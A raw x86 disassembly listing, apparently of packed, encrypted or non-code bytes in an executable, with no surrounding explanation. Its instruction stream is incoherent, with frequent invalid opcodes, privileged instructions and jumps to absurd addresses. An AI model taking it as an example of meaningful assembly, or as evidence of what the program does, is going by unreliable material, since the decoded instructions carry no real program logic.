  40fcff:	lods   eax,DWORD PTR ds:[esi]
  40fd00:	lods   eax,DWORD PTR ds:[esi]
  40fd01:	and    BYTE PTR [eax-0x7f3a43b5],al
  40fd07:	fs sub edi,edx
  40fd0a:	xchg   ebp,eax
  40fd0b:	stos   DWORD PTR es:[edi],eax
  40fd0c:	jecxz  0x40fcb6
  40fd0e:	das    
  40fd0f:	(bad)
  40fd13:	int3   
  40fd14:	aas    
  40fd15:	push   esp
  40fd16:	jecxz  0x40fcb2
  40fd18:	adc    dl,cl
  40fd1a:	ja     0x40fcc0
  40fd1c:	mov    bl,BYTE PTR [ebx-0x23]
  40fd1f:	push   ebx
  40fd20:	adc    al,0x12
  40fd22:	inc    ecx
  40fd23:	pop    eax
  40fd24:	mov    eax,ds:0x945424d4
  40fd29:	pop    esi
  40fd2a:	fiadd  WORD PTR [ecx+0x2917ba29]
  40fd30:	jae    0x40fcdd
  40fd32:	inc    ecx
  40fd33:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fd34:	cmp    ebx,esi
  40fd36:	mov    esi,0x4b4fcf19
  40fd3b:	jl     0x40fd20
  40fd3d:	not    BYTE PTR [eax]
  40fd3f:	jno    0x40fd07
  40fd41:	jo     0x40fd86
  40fd43:	stos   DWORD PTR es:[edi],eax
  40fd44:	xchg   ebx,eax
  40fd45:	or     BYTE PTR ds:0x5922d5a0,dh
  40fd4b:	repnz dec edi
  40fd4d:	ror    BYTE PTR [edi-0x7ea5c859],0xb5
  40fd54:	sbb    eax,0x8cd732ac
  40fd59:	fdivr  QWORD PTR [eax]
  40fd5b:	xchg   ebp,eax
  40fd5c:	and    eax,DWORD PTR [ecx+edx*1+0x1f6489b5]
  40fd63:	or     cl,ah
  40fd65:	dec    ecx
  40fd66:	jl     0xa6160118
  40fd6c:	aas    
  40fd6d:	xchg   edx,eax
  40fd6e:	scas   al,BYTE PTR es:[edi]
  40fd6f:	(bad)  
  40fd70:	nop
  40fd71:	push   ebp
  40fd72:	lods   al,BYTE PTR ds:[esi]
  40fd73:	fidiv  WORD PTR [edi]
  40fd75:	or     DWORD PTR ds:0x2b2c03f7,esp
  40fd7b:	sub    DWORD PTR fs:[edi],esi
  40fd7e:	nop
  40fd7f:	and    ebp,esi
  40fd81:	gs adc eax,0x5ea6fbba
  40fd87:	sub    eax,0x599d74f0
  40fd8c:	sub    ah,bh
  40fd8e:	inc    ecx
  40fd8f:	cmp    eax,0x5ed67c60
  40fd94:	repz xlat BYTE PTR ds:[ebx]
  40fd96:	(bad)  
  40fd97:	fcmovnb st,st(0)
  40fd99:	or     DWORD PTR [ebp+ebx*4-0x18],edi
  40fd9d:	das    
  40fd9e:	adc    ebp,DWORD PTR [ebx-0x3c]
  40fda1:	jl     0x40fd44
  40fda3:	add    eax,0x4f147634
  40fda8:	xchg   ebp,eax
  40fda9:	scas   eax,DWORD PTR es:[edi]
  40fdaa:	stos   BYTE PTR es:[edi],al
  40fdab:	(bad)  
  40fdac:	jne    0x40fe04
  40fdae:	clc    
  40fdaf:	sbb    DWORD PTR [edi],edx
  40fdb1:	enter  0x18e8,0x1d
  40fdb5:	mov    ah,0xdd
  40fdb7:	add    ecx,ebp
  40fdb9:	and    esp,ebp
  40fdbb:	mov    edi,0x285ffc
  40fdc0:	hlt    
  40fdc1:	mov    esi,0xe9e08c51
  40fdc6:	shl    BYTE PTR [eax+0x23],cl
  40fdc9:	sbb    BYTE PTR [edi-0x3354512],0x58
  40fdd0:	(bad)  
  40fdd1:	mov    eax,ds:0xc9ae7250
  40fdd6:	cmp    eax,0xb9ea06ad
  40fddb:	cs pop ebx
  40fddd:	sahf   
  40fdde:	imul   esi,DWORD PTR [edi+0x69a9a12b],0x79
  40fde5:	imul   ebp,DWORD PTR [ebp-0x68784148],0x73
  40fdec:	(bad)  
  40fded:	push   ebx
  40fdee:	mov    edx,0x8351a038
  40fdf3:	adc    eax,0xacfec5cd
  40fdf8:	jecxz  0x40fd9a
  40fdfa:	sub    dh,0x69
  40fdfd:	scas   al,BYTE PTR es:[edi]
  40fdfe:	xchg   ecx,eax
  40fdff:	push   ecx
  40fe00:	jp     0x40fe36
  40fe02:	cmp    esp,DWORD PTR [edx-0x26c1cefe]
  40fe08:	inc    esi
  40fe09:	mov    edx,0x9e7e0771
  40fe0e:	sbb    ecx,esi
  40fe10:	les    ebx,FWORD PTR [esp+edx*1+0x4172f614]
  40fe17:	ins    DWORD PTR es:[edi],dx
  40fe18:	xchg   DWORD PTR [edi-0x6f],ecx
  40fe1b:	lods   eax,DWORD PTR ds:[esi]
  40fe1c:	sub    DWORD PTR [ecx-0xf],0xffffffb0
  40fe20:	inc    eax
  40fe21:	dec    ebx
  40fe22:	pop    es
  40fe23:	and    bh,BYTE PTR [edx]
  40fe25:	lahf   
  40fe26:	pop    ds
  40fe27:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fe28:	mov    esp,cs
  40fe2a:	and    bh,BYTE PTR [eax]
  40fe2c:	mov    WORD PTR [edi-0x17bb944b],fs
  40fe32:	repz mov cs:0xcc25473d,eax
  40fe39:	xchg   edi,eax
  40fe3a:	jnp    0x40fdf4
  40fe3c:	sahf   
  40fe3d:	cmc    
  40fe3e:	bound  edx,QWORD PTR [ecx-0x74513fcb]
  40fe44:	ror    DWORD PTR [eax-0x1],0xfb
  40fe48:	ds mov edi,0x5da04041
  40fe4e:	pushf  
  40fe4f:	stc    
  40fe50:	xchg   ebp,eax
  40fe51:	push   esi
  40fe52:	push   cs
  40fe53:	jmp    0x40fe66
  40fe55:	jp     0x40fde8
  40fe57:	sahf   
  40fe58:	dec    eax
  40fe59:	sbb    edi,DWORD PTR [edi+0x2]
  40fe5c:	ret    
  40fe5d:	loop   0x40fde6
  40fe5f:	inc    eax
  40fe60:	into   
  40fe61:	mov    esi,0xfc424f3e
  40fe66:	xor    ch,BYTE PTR [edi+eiz*1+0x2304e1b4]
  40fe6d:	ins    BYTE PTR es:[edi],dx
  40fe6e:	adc    al,0x44
  40fe70:	cmc    
  40fe71:	inc    eax
  40fe72:	cmp    eax,0x2a11d575
  40fe77:	push   0xfffffffe
  40fe79:	scas   al,BYTE PTR es:[edi]
  40fe7a:	mov    ch,bh
  40fe7c:	(bad)  
  40fe7d:	out    0x48,al
  40fe7f:	sbb    ecx,eax
  40fe81:	pop    es
  40fe82:	fwait
  40fe83:	xor    BYTE PTR [esi-0x6],bl
  40fe86:	sbb    al,0x17
  40fe88:	jge    0x40fefe
  40fe8a:	std    
  40fe8b:	push   esi
  40fe8c:	rcr    ah,cl
  40fe8e:	mov    esi,0xfc9fcb54
  40fe93:	inc    ebp
  40fe94:	sub    eax,0xf869e1d
  40fe99:	mov    esi,0xc3673ac
  40fe9e:	ss jbe 0x40fe3d
  40fea1:	push   0x7158656e
  40fea6:	xchg   edx,eax
  40fea7:	and    al,0x3f
  40fea9:	mov    esi,0x78900f6d
  40feae:	stos   DWORD PTR es:[edi],eax
  40feaf:	xor    al,0xc3
  40feb1:	frstor [edx]
  40feb3:	sbb    al,0x9e
  40feb5:	dec    ecx
  40feb6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40feb7:	cmp    ecx,DWORD PTR [edx+ebp*1-0x6abe1033]
  40febe:	in     al,dx
  40febf:	mov    eax,ds:0xdf4c2f86
  40fec4:	xor    DWORD PTR [edi+0x1b],0xcccaa2f2
  40fecb:	ror    BYTE PTR [ecx+0x12],1
  40fece:	pop    edi
  40fecf:	mov    eax,0x66c3881a
  40fed4:	inc    edi
  40fed5:	ds aaa 
  40fed7:	(bad)
  40feda:	mov    ah,BYTE PTR [ebx-0x6c]
  40fedd:	xor    BYTE PTR [esi],ah
  40fedf:	pop    edx
  40fee0:	cmp    eax,0x94fc13b5
  40fee5:	int3   
  40fee6:	lock jae 0x40feac
  40fee9:	push   esp
  40feea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40feeb:	add    BYTE PTR [ebp+edi*4+0x6d4154b7],al
  40fef2:	nop
  40fef3:	jecxz  0x40fea1
  40fef5:	dec    esi
  40fef6:	into   
  40fef7:	into   
  40fef8:	fs mov esi,0x95edf120
  40fefe:	or     esi,edi
  40ff00:	fcom   st(1)
  40ff02:	xchg   ebx,eax
  40ff03:	nop
  40ff04:	or     ebx,ebp
  40ff06:	mov    eax,ds:0xdf9e402d
  40ff0b:	push   ebp
  40ff0c:	dec    ecx
  40ff0d:	or     bh,BYTE PTR [ecx]
  40ff0f:	imul   ebx,DWORD PTR [edx+0x5cbe9048],0x9915b350
  40ff19:	xor    al,0x50
  40ff1b:	cmp    BYTE PTR [eax+ebx*2-0x67f88cc0],bl
  40ff22:	gs hlt 
  40ff24:	fwait
  40ff25:	out    dx,al
  40ff26:	mov    esp,0xa8b1c4c1
  40ff2b:	add    BYTE PTR [ecx],dl
  40ff2d:	lods   al,BYTE PTR ds:[esi]
  40ff2e:	ins    BYTE PTR es:[edi],dx
  40ff2f:	cli    
  40ff30:	pop    eax
  40ff31:	xlat   BYTE PTR ds:[ebx]
  40ff32:	inc    ebp
  40ff33:	lods   eax,DWORD PTR ds:[esi]
  40ff34:	fidivr DWORD PTR [eax-0x6f]
  40ff37:	mov    DWORD PTR [edx],ebp
  40ff39:	addr16 rcr eax,cl
  40ff3c:	mov    bh,0xaf
  40ff3e:	das    
  40ff3f:	mov    cl,0xbc
  40ff41:	out    dx,al
  40ff42:	sbb    edx,DWORD PTR [edi+0xb]
  40ff45:	lods   al,BYTE PTR ds:[esi]
  40ff46:	mov    al,0x8f
  40ff48:	adc    ch,dh
  40ff4a:	inc    edx
  40ff4b:	cdq    
  40ff4c:	loop   0x40ffc8
  40ff4e:	daa    
  40ff4f:	pop    eax
  40ff50:	aam    0x79
  40ff52:	dec    esp
  40ff53:	aas    
  40ff54:	mov    dl,0x56
  40ff56:	sbb    al,0x84
  40ff58:	inc    eax
  40ff59:	clc    
  40ff5a:	test   DWORD PTR [eax+edi*1+0x2d],ebx
  40ff5e:	lock add bl,BYTE PTR [edi+0x4a15f1a3]
  40ff65:	dec    ecx
  40ff66:	xor    eax,0x691f96f1
  40ff6b:	xchg   edi,eax
  40ff6c:	aam    0xd6
  40ff6e:	add    BYTE PTR [esi+0x75692bb7],dh
  40ff74:	mov    esi,0x1c377726
  40ff79:	call   0x69dee9d
  40ff7e:	adc    DWORD PTR [ebx],0x20
  40ff81:	adc    DWORD PTR [ecx+0x53],edi
  40ff84:	retf   
  40ff85:	xor    ebx,DWORD PTR [esi+ebp*2-0x18ce7891]
  40ff8c:	and    al,0x59
  40ff8e:	inc    edx
  40ff8f:	mov    al,ds:0xc137e605
  40ff94:	loop   0x40ffbd
  40ff96:	les    edx,FWORD PTR [edx+0x25]
  40ff99:	sbb    BYTE PTR [eax+0x49],ch
  40ff9c:	icebp  
  40ff9d:	fcom   st(4)
  40ff9f:	repz dec esi
  40ffa1:	sbb    DWORD PTR [eax+0xe],edi
  40ffa4:	pop    esp
  40ffa5:	xchg   BYTE PTR [esi+0x3d71f60c],al
  40ffab:	fs std 
  40ffad:	inc    eax
  40ffae:	call   0x9716987d
  40ffb3:	aas    
  40ffb4:	hlt    
  40ffb5:	adc    DWORD PTR [esi],esi
  40ffb7:	inc    ecx
  40ffb8:	rcr    DWORD PTR [eax+0x5cce659e],cl
  40ffbe:	adc    BYTE PTR [eax-0x6b23e118],bh
  40ffc4:	xor    eax,0x373045aa
  40ffc9:	jo     0x40ffa9
  40ffcb:	int    0x31
  40ffcd:	test   DWORD PTR [eax+0x4d],edi
  40ffd0:	xchg   edi,eax
  40ffd1:	and    dh,ah
  40ffd3:	es pop edx
  40ffd5:	mov    bl,0xb5
  40ffd7:	sub    dl,bl
  40ffd9:	xchg   edx,eax
  40ffda:	adc    esi,ebx
  40ffdc:	hlt    
  40ffdd:	mov    ecx,DWORD PTR [eax-0x60fcd86d]
  40ffe3:	pop    ebx
  40ffe4:	fsubrp st(4),st
  40ffe6:	in     al,dx
  40ffe7:	sbb    al,0x5f
  40ffe9:	push   0xc1121a71
  40ffee:	jne    0x40ffdc
  40fff0:	or     DWORD PTR [edx+0x27],edi
  40fff3:	pop    esp
  40fff4:	call   0xd1a36c95
  40fff9:	(bad)  
  40fffa:	ficomp WORD PTR [eax+eax*2-0x63]
  40fffe:	xor    BYTE PTR [esi],bl
  410000:	xlat   BYTE PTR ds:[ebx]
  410001:	lock push 0xc45ecefe
  410007:	adc    eax,0x7259138
  41000c:	pop    esi
  41000d:	xchg   esp,eax
  41000e:	out    0xca,al
  410010:	sub    eax,esp
  410012:	jl     0x40ffa2
  410014:	dec    BYTE PTR [edi+0x2d000f3e]
  41001a:	icebp  
  41001b:	and    ecx,DWORD PTR ds:[edi]
  41001e:	or     eax,0xa7dee253
  410023:	xchg   ebp,eax
  410024:	cmp    BYTE PTR [esi+0x7ccfd58d],al
  41002a:	add    al,0x1
  41002c:	(bad)  
  41002d:	and    al,0xcf
  41002f:	jnp    0x410062
  410031:	hlt    
  410032:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410033:	jo     0x40ffd6
  410035:	repz cmc 
  410037:	pop    ecx
  410038:	aam    0x5c
  41003a:	mov    eax,0x2059484
  41003f:	push   es
  410040:	or     ebx,edi
  410042:	or     eax,0x6f4a2560
  410047:	in     al,dx
  410048:	pop    ss
  410049:	dec    edx
  41004a:	daa    
  41004b:	add    eax,0xf902c6e9
  410050:	adc    al,0xbd
  410052:	shl    DWORD PTR [ebx+edi*1+0x76],1
  410056:	sbb    eax,DWORD PTR [edi-0x78943c94]
  41005c:	pushf  
  41005d:	mov    DWORD PTR [ebx],ebp
  41005f:	inc    ebp
  410060:	loope  0x410043
  410062:	push   cs
  410063:	ins    BYTE PTR es:[edi],dx
  410064:	mov    dh,0xe7
  410066:	jne    0x4100c2
  410068:	adc    al,0x5d
  41006a:	or     DWORD PTR [esi],edx
  41006c:	popa   
  41006d:	xlat   BYTE PTR ds:[ebx]
  41006e:	enter  0x7ffc,0x25
  410072:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410073:	xor    eax,0xb85c99d
  410078:	jo     0x4100e2
  41007a:	in     eax,dx
  41007b:	call   0xe0196645
  410080:	mov    ah,0x97
  410082:	jae    0x4100f4
  410084:	fcomip st,st(2)
  410086:	inc    ecx
  410087:	popa   
  410088:	xchg   ebx,eax
  410089:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41008a:	push   0x3a
  41008c:	stc    
  41008d:	shr    DWORD PTR [edx-0x3d46a8ca],cl
  410093:	push   ebp
  410094:	mov    edi,0x84da2dae
  410099:	add    eax,0xa9a00b7f
  41009e:	or     BYTE PTR [esi-0x24],dh
  4100a1:	scas   al,BYTE PTR es:[edi]
  4100a2:	push   esi
  4100a3:	gs retf 
  4100a5:	inc    esp
  4100a6:	push   esi
  4100a7:	pop    edi
  4100a8:	dec    esp
  4100a9:	mov    bh,0x62
  4100ab:	nop
  4100ac:	test   edx,esi
  4100ae:	leave  
  4100af:	cdq    
  4100b0:	mov    WORD PTR [edx+0x66987218],gs
  4100b6:	ficomp WORD PTR [ebp+eiz*2+0x2a3ad193]
  4100bd:	in     al,0x1c
  4100bf:	(bad)  
  4100c0:	aam    0xfb
  4100c2:	xchg   ebp,eax
  4100c3:	clc    
  4100c4:	push   esp
  4100c5:	and    BYTE PTR [ebx+0x54a8831b],ah
  4100cb:	add    BYTE PTR [ecx+0x1b],0xc3
  4100cf:	inc    esp
  4100d0:	mov    eax,0x95c24899
  4100d5:	add    eax,0x562de565
  4100da:	lods   eax,DWORD PTR ds:[esi]
  4100db:	xor    al,BYTE PTR [ebp-0x1a108c19]
  4100e1:	mov    ebp,0x331c254
  4100e6:	xor    ebp,DWORD PTR [eax]
  4100e8:	dec    esp
  4100e9:	push   esi
  4100ea:	cmp    al,0x1a
  4100ec:	adc    esp,DWORD PTR gs:[edx-0x1]
  4100f0:	jne    0x4100c9
  4100f2:	mov    esi,0x24942ce4
  4100f7:	jnp    0x410131
  4100f9:	daa    
  4100fa:	or     cl,BYTE PTR [ebx]
  4100fc:	in     al,dx
  4100fd:	dec    edx
  4100fe:	pop    ebx
  4100ff:	ja     0x4100b1
  410101:	and    BYTE PTR [ebx],ch
  410103:	shl    BYTE PTR [ebx],cl
  410105:	sub    BYTE PTR [ecx-0x6e],0x1f
  410109:	xor    eax,0x55e09cc8
  41010e:	sti    
  41010f:	and    eax,DWORD PTR [edi-0x66]
  410112:	popa   
  410113:	and    ecx,DWORD PTR [edi-0x57]
  410116:	frstor [ebx]
  410118:	stos   DWORD PTR es:[edi],eax
  410119:	pop    esp
  41011a:	dec    eax
  41011b:	xchg   BYTE PTR [ebp-0x21b3becb],bh
  410121:	xlat   BYTE PTR ds:[ebx]
  410122:	xor    ah,BYTE PTR [ebx]
  410124:	push   ds
  410125:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410126:	push   ds
  410127:	pop    eax
  410128:	jns    0x410188
  41012a:	ins    BYTE PTR es:[edi],dx
  41012b:	test   DWORD PTR cs:[ebp+0x6267d4a0],0x57e7bc20
  410136:	in     eax,0x62
  410138:	xchg   ebx,eax
  410139:	(bad)  
  41013a:	into   
  41013b:	sub    eax,DWORD PTR [eax+0x70]
  41013e:	xor    al,0x86
  410140:	push   esp
  410141:	stc    
  410142:	jno    0x41013a
  410144:	std    
  410145:	mov    esi,0xa571898a
  41014a:	mov    al,ds:0x62b862ff
  41014f:	adc    ebp,ebp
  410151:	loopne 0x4101cc
  410153:	push   edi
  410154:	push   es
  410155:	aas    
  410156:	(bad)  
  410157:	(bad)
  41015a:	daa    
  41015b:	in     eax,0xc7
  41015d:	(bad)  
  41015f:	(bad)  
  410161:	(bad)  
  410163:	loop   0x4100ef
  410165:	sbb    eax,0x7efaf308
  41016a:	data16 arpl WORD PTR [edx],sp
  41016d:	xchg   esi,eax
  41016e:	leave  
  41016f:	jecxz  0x4101b8
  410171:	popa   
  410172:	or     ebx,DWORD PTR [ebx]
  410174:	xchg   esp,eax
  410175:	xchg   DWORD PTR [esi+0x27],eax
  410178:	cmp    DWORD PTR [eax-0x2d],edi
  41017b:	push   eax
  41017c:	fs sbb eax,eax
  41017f:	xchg   BYTE PTR [eax+edi*8],dh
  410182:	push   esi
  410183:	nop
  410184:	out    dx,al
  410185:	xor    al,bh
  410187:	aaa    
  410188:	xchg   ebp,eax
  410189:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41018a:	inc    edx
  41018b:	sbb    esi,DWORD PTR [edi-0x73f3906c]
  410191:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410192:	dec    edi
  410193:	arpl   WORD PTR [edx],cx
  410195:	jmp    0x6755498f
  41019a:	fwait
  41019b:	gs pusha 
  41019d:	sub    ah,ah
  41019f:	inc    edi
  4101a0:	adc    esi,DWORD PTR [esi-0xb031d55]
  4101a6:	dec    esi
  4101a7:	sbb    bh,ah
  4101a9:	add    DWORD PTR [edx],ebx
  4101ab:	mov    ebx,0x7b3835c3
  4101b1:	inc    ebx
  4101b2:	push   eax
  4101b3:	out    dx,eax
  4101b4:	mov    ds:0xbba60fe0,eax
  4101b9:	sub    cl,BYTE PTR [ecx]
  4101bb:	mov    BYTE PTR [edi+0x2d],bh
  4101be:	stos   BYTE PTR es:[edi],al
  4101bf:	mov    bh,0x5d
  4101c1:	stos   DWORD PTR es:[edi],eax
  4101c2:	xchg   edi,eax
  4101c3:	inc    ebx
  4101c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4101c5:	cmp    ah,BYTE PTR [ebx-0x145907b2]
  4101cb:	inc    ebp
  4101cc:	fsubr  QWORD PTR [edi-0x6d5a04e5]
  4101d2:	aad    0xc1
  4101d4:	sub    DWORD PTR [eax],edx
  4101d6:	mov    ah,0x35
  4101d8:	std    
  4101d9:	outs   dx,BYTE PTR ds:[esi]
  4101da:	gs retf 0xc810
  4101de:	sub    ah,cl
  4101e0:	test   eax,0x82e383e5
  4101e5:	sub    bl,BYTE PTR [eax-0x10793774]
  4101eb:	xchg   edx,eax
  4101ec:	mov    dl,0xa9
  4101ee:	repnz fsub QWORD PTR [ebp+0x5cb4e9c4]
  4101f5:	push   edx
  4101f6:	retf   0xaec3
  4101f9:	rcl    DWORD PTR gs:[ebp+0x75644f05],0x6c
  410201:	mov    eax,es
  410203:	add    BYTE PTR ds:0x344c6a8d,ch
  410209:	push   esp
  41020a:	jl     0x41022d
  41020c:	ror    BYTE PTR [ebp-0x62],1
  41020f:	push   ebx
  410210:	xor    esp,edi
  410212:	xlat   BYTE PTR ds:[ebx]
  410213:	ins    BYTE PTR es:[edi],dx
  410214:	xchg   ebp,eax
  410215:	push   0xa333512
  41021a:	fisttp WORD PTR [edi-0xb245482]
  410220:	leave  
  410221:	mov    edx,0x66239619
  410226:	dec    ebx
  410227:	es cmp eax,0x4522cafe
  41022d:	push   ebp
  41022e:	mov    esp,0x5d3583cd
  410233:	dec    esi
  410234:	cmc    
  410235:	xchg   edx,eax
  410236:	and    cl,dl
  410238:	mov    WORD PTR [eax-0x7a800261],ss
  41023e:	ds xchg edi,eax
  410240:	add    al,0x14
  410242:	out    0xae,al
  410244:	and    BYTE PTR [edi],bl
  410246:	push   esi
  410248:	dec    ebx
  410249:	sub    eax,DWORD PTR [edi-0x7042ead2]
  41024f:	inc    ebx
  410250:	gs lahf 
  410252:	adc    ch,BYTE PTR ds:0x6fff39bf
  410258:	cmp    DWORD PTR [eax-0x6d5f0314],esp
  41025e:	fwait
  41025f:	(bad)  
  410260:	sub    eax,DWORD PTR ss:[ebx]
  410263:	sbb    DWORD PTR [ebp-0x18edb50],ebx
  410269:	fcomip st,st(5)
  41026b:	sbb    ah,bl
  41026d:	mov    ch,al
  41026f:	ja     0x41027f
  410271:	cli    
  410272:	xchg   edi,eax
  410273:	pop    es
  410274:	imul   esp,DWORD PTR [ebx-0x69d84d2f],0x36c01b5c
  41027e:	dec    ecx
  41027f:	inc    ecx
  410280:	mov    dh,0x89
  410282:	sbb    DWORD PTR [edi+0x42],edi
  410285:	sub    eax,0x5d506c1b
  41028a:	pop    ss
  41028b:	mov    dh,0x1f
  41028d:	sbb    al,0x54
  41028f:	(bad)  
  410291:	mov    bh,0xcf
  410293:	fst    DWORD PTR [esi-0x6f5b63ba]
  410299:	sahf   
  41029a:	and    edi,DWORD PTR [esi]
  41029c:	adc    BYTE PTR fs:[edi+0x35ea4dc5],0x4c
  4102a4:	sbb    al,0x27
  4102a6:	hlt    
  4102a7:	ret    0x763
  4102aa:	dec    ebx
  4102ab:	and    BYTE PTR [eax+0x14],ch
  4102ae:	test   eax,0x2fd8d764
  4102b3:	imul   DWORD PTR [ecx]
  4102b5:	idiv   BYTE PTR [edx]
  4102b7:	or     esi,0xfffffffc
  4102ba:	fadd   DWORD PTR [edx-0x668ab380]
  4102c0:	inc    edi
  4102c1:	xchg   dh,dh
  4102c3:	icebp  
  4102c4:	inc    esp
  4102c5:	mov    ecx,0x6f5df957
  4102ca:	lods   eax,DWORD PTR ds:[esi]
  4102cb:	and    al,0x90
  4102cd:	mov    ebx,esi
  4102cf:	dec    ebp
  4102d0:	mov    ds:0x55bea38e,eax
  4102d5:	sahf   
  4102d6:	or     ch,0x2a
  4102d9:	mov    bh,0x4a
  4102db:	or     al,ah
  4102dd:	sti    
  4102de:	pushf  
  4102df:	int    0x29
  4102e1:	jne    0x410306
  4102e3:	pop    edi
  4102e4:	push   cs
  4102e5:	cmove  edx,DWORD PTR ds:0x4ff74e93
  4102ec:	(bad)  
  4102ed:	scas   al,BYTE PTR es:[edi]
  4102ee:	mov    bh,0x3c
  4102f0:	cld    
  4102f1:	ret    0xfa5f
  4102f4:	adc    eax,0x7dbd278
  4102f9:	iret   
  4102fa:	ret    0x3ef0
  4102fd:	repnz arpl WORD PTR [esp+eiz*4],ax
  410301:	and    esi,DWORD PTR [esi+0x6d]
  410304:	mov    eax,ds:0xea83bd61
  410309:	dec    esi
  41030a:	repnz push edi
  41030c:	test   eax,0xc656b32b
  410311:	pusha  
  410312:	test   al,0xb8
  410314:	cmp    eax,0xad0e6511
  410319:	push   esp
  41031a:	out    dx,eax
  41031b:	cwde   
  41031c:	xor    BYTE PTR [ebp-0x15],dl
  41031f:	cmp    BYTE PTR [ebx+0x4640b5b8],cl
  410325:	push   ebx
  410326:	ins    BYTE PTR es:[edi],dx
  410327:	in     eax,0xb0
  410329:	mov    ebp,0xac75e326
  41032e:	lods   al,BYTE PTR ds:[esi]
  41032f:	stos   BYTE PTR es:[edi],al
  410330:	and    DWORD PTR [esi+0x1322c1e2],ebx
  410336:	xchg   esp,eax
  410337:	adc    dh,dl
  410339:	dec    esi
  41033b:	(bad)  
  41033d:	mov    bl,0x63
  41033f:	sub    al,0xe1
  410341:	jb     0x4103a5
  410343:	or     dh,BYTE PTR [ebx]
  410345:	ficomp WORD PTR ds:0x1a773fbb
  41034b:	in     eax,dx
  41034c:	daa    
  41034d:	adc    BYTE PTR [edx-0x5b040116],dl
  410353:	jo     0x4103b4
  410355:	cdq    
  410356:	aas    
  410357:	adc    bl,BYTE PTR [ebx+edx*1-0x20]
  41035b:	push   edx
  41035c:	int3   
  41035d:	pop    edi
  41035e:	push   DWORD PTR [ecx]
  410360:	adc    al,0x5b
  410362:	test   al,0x5c
  410364:	sbb    eax,0xe08fb37b
  410369:	push   ds
  41036a:	in     eax,dx
  41036b:	inc    eax
  41036c:	xchg   edx,eax
  41036d:	ficom  WORD PTR [edx-0x40062024]
  410373:	sbb    bh,BYTE PTR [ebx+0x5de4f541]
  410379:	mov    ecx,0x8ef1f481
  41037e:	pop    ecx
  41037f:	pop    edx
  410380:	push   cs
  410381:	sub    edi,DWORD PTR [eax+esi*2-0x35]
  410385:	scas   eax,DWORD PTR es:[edi]
  410386:	popf   
  410387:	pop    eax
  410388:	nop
  410389:	loopne 0x4103b8
  41038b:	xchg   ebp,eax
  41038c:	push   esp
  41038d:	sar    dl,0xf3
  410390:	or     ebx,DWORD PTR [edx+0x5bcec0dc]
  410396:	inc    edi
  410398:	dec    esi
  410399:	jns    0x41040b
  41039b:	loop   0x410384
  41039d:	mov    dl,0xab
  41039f:	aam    0xf3
  4103a1:	out    dx,eax
  4103a2:	stc    
  4103a3:	and    edi,edi
  4103a5:	jmp    0x41035c
  4103a7:	test   DWORD PTR ds:0xe54e2b24,esp
  4103ad:	stos   DWORD PTR es:[edi],eax
  4103ae:	cmp    eax,DWORD PTR [ecx]
  4103b0:	add    BYTE PTR [edi+esi*2-0x5d],ah
  4103b4:	xchg   esi,eax
  4103b5:	push   cs
  4103b6:	int    0x58
  4103b8:	sub    eax,0xcaa67699
  4103bd:	push   0xaeb3f1a9
  4103c2:	jb     0x41042f
  4103c4:	push   DWORD PTR [ebx+0x19]
  4103c7:	xchg   ebx,eax
  4103c8:	sbb    al,0x68
  4103ca:	push   eax
  4103cb:	jle    0x410365
  4103cd:	(bad)  
  4103ce:	mov    gs,ecx
  4103d0:	in     eax,0x88
  4103d2:	repz sbb eax,0xc9b42488
  4103d8:	js     0x410454
  4103da:	sub    al,0xae
  4103dc:	scas   al,BYTE PTR es:[edi]
  4103dd:	jmp    0x3830:0x521c9922
  4103e4:	mov    ebx,edx
  4103e6:	or     al,BYTE PTR [esi]
  4103e8:	mov    ds:0x6ad517bd,al
  4103ed:	jo     0x410391
  4103ef:	pushf  
  4103f0:	fwait
  4103f1:	pop    ebx
  4103f2:	fdiv   QWORD PTR [ebx-0x5]
  4103f5:	mov    ch,0x48
  4103f7:	cmp    ecx,DWORD PTR [ecx-0x2572c24e]
  4103fd:	retf   
  4103fe:	ja     0x410460
  410400:	and    al,BYTE PTR [edx+edi*1+0x4f4f5271]
  410407:	cmp    DWORD PTR [ebx+esi*2],eax
  41040a:	loopne 0x410443
  41040c:	cdq    
  41040d:	idiv   edx
  41040f:	dec    edi
  410410:	or     eax,0x8d25c4cc
  410415:	cmp    eax,DWORD PTR [ecx]
  410417:	cld    
  410418:	leave  
  410419:	cs mov ebp,0x68f31ed6
  41041f:	dec    esp
  410420:	xor    DWORD PTR [ebx],esi
  410422:	mov    edi,0x699b7e0c
  410427:	mov    bl,0x90
  410429:	jmp    0x2a92426b
  41042e:	mov    ds:0x4ccb1873,eax
  410433:	pop    ebx
  410434:	dec    edx
  410435:	inc    esp
  410436:	pusha  
  410437:	cmp    DWORD PTR [ebp+0x2a],0x42
  41043b:	jg     0x41048c
  41043d:	popa   
  41043e:	and    al,BYTE PTR [ecx-0x70]
  410441:	xor    BYTE PTR [esp+eiz*8-0x119ea682],dl
  410448:	dec    eax
  410449:	bound  esi,QWORD PTR ds:0xe12eacdf
  41044f:	push   cs
  410450:	xchg   esi,eax
  410451:	(bad)  
  410452:	fcom   DWORD PTR [eax]
  410454:	or     BYTE PTR [ebx-0x78],dh
  410457:	adc    al,0x31
  410459:	(bad)
  41045d:	push   0xfffffff6
  41045f:	or     edi,ecx
  410461:	push   0x95a75194
  410466:	or     al,0x37
  410468:	or     eax,0xf7f1117c
  41046d:	(bad)  
  41046e:	mov    edi,0x7573302a
  410473:	push   0x4278c6f3
  410478:	pop    edx
  410479:	push   cs
  41047a:	mov    ebp,0xa5250c4e
  41047f:	mov    bh,0x80
  410481:	mov    ds:0xb68340e2,eax
  410486:	cmp    DWORD PTR [edi+0x28],0x4f
  41048a:	mov    ds:0xfbb1bf6a,eax
  41048f:	hlt    
  410490:	enter  0x6ca9,0x91
  410494:	pop    edi
  410495:	add    eax,0x8f90505e
  41049a:	jmp    0xc47c:0x741210f5
  4104a1:	pop    ebx
  4104a2:	jl     0x410460
  4104a4:	bswap  edx
  4104a6:	pop    ecx
